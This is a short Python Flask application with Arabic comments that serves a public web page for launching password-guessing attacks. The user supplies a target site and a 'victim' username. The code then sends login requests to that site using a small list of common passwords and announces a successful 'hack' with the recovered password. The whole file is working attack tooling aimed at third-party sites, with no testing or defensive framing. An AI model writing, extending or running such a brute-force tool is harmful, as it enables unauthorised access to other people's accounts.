from flask import Flask, render_template, request, jsonify
import requests
import threading

app = Flask(__name__)

# محرك الهجوم: تخمين + ثغرات
def attack_engine(site, user):
    # قائمة كلمات مرور مدمجة بسيطة للسرعة
    passwords = ["123456", "password", "admin123", "qwerty", "iloveyou"] 
    for pwd in passwords:
        try:
            # محاكاة الهجوم على رابط تسجيل الدخول
            res = requests.post(f"http://{site}/login", data={'username': user, 'password': pwd}, timeout=2)
            if res.status_code == 200 and "welcome" in res.text.lower():
                return pwd
        except:
            continue
    return None

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/launch', methods=['POST'])
def launch():
    target = request.form.get('site')
    victim = request.form.get('username')
    result = attack_engine(target, victim)
    if result:
        return f"<h1> الاختراق نجح! كلمة المرور هي: {result} 💀</h1>"
    return "<h1> فشل الاختراق أو الموقع محمي ❌</h1>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80) # تشغيل الموقع على العام